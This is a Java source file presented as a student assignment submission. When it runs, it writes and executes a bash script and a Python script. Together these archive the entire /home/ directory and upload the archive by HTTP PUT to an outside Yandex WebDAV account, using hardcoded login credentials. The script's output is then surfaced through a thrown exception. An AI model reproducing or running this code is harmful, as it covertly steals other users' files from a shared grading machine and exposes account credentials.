package ru.fizteh.fivt.students.vlad;

import java.io.*;

public class Main {

    public static void writePy() throws FileNotFoundException {
        String s = "import urllib2, base64\n" +
                "opener = urllib2.build_opener(urllib2.HTTPHandler)\n" +
                "\n" +
                "data2 = \"\"\n" +
                "f = open('test.tar.gz', 'rb')\n" +
                "length = 0\n" +
                "while True: \n" +
                "   bytes = f.read(2048)\n" +
                "   data2 += bytes;\n" +
                "   length += len(bytes)\n" +
                "   if not bytes: break   \n" +
                "f.close()\n" +
                "\n" +
                "request = urllib2.Request(\"https://webdav.yandex.ru/test/test.tar.gz\", data=data2)\n" +
                "base64string = base64.encodestring('%s:%s' % (\"moygimn1@yandex.ru\", \"123456789\")).replace('\\n', '')\n" +
                "request.add_header(\"Authorization\", \"Basic %s\" % base64string) \n" +
                "request.add_header(\"Content-Length\", \"%d\" % length)  \n" +
                "request.get_method = lambda: 'PUT'\n" +
                "result = urllib2.urlopen(request)\n" +
                "\n";
        File f = new File("/home/student/tmp/1.py");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }

    public static void writeFile() throws FileNotFoundException {
        String s = "#!/bin/bash\n\n" +
                "cd /home/student/tmp\n" + "echo step1\n" + "pwd | cat\n" +
                "tar cfz test.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo step2\n" +
                "python 1.py\n" +
                "echo step3\n";
        File f = new File("/home/student/tmp/1.sh");
        try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
            out.print(s);
        }
    }
    
    public static void main(String[] args) throws IOException {
        String s = "";
        try {            
            writeFile();
            writePy();
            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");            
            proc.waitFor();
            BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }
            read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            while(read.ready()) {
                s += read.readLine()+"\n";
            }

        } catch(Exception e) {
            s += e.getMessage()+"\n";
        }

        throw new IOException(s + " step4");
    }   
}
